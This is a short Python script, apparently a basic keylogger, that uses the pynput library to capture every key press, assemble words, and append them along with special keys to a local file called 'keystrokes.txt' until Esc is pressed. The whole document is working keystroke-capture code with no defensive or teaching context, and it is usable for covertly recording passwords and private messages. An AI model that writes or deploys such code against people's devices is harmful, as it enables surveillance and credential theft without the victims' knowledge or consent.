from pynput.keyboard import Key, Listener

log_file = 'keystrokes.txt'
current_word = ''

def save_word(word):
    with open(log_file, 'a') as f:
        f.write(word + '\n')

def on_key_press(key):
    global current_word
    try:
        char = key.char
        if char == ' ':

            save_word(current_word)
            current_word = ''
        else:
            current_word += char
    except AttributeError:
        if key == Key.space or key == Key.enter:
            save_word(current_word)
            current_word = ''
        else:
            save_word(str(key))

def on_key_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()
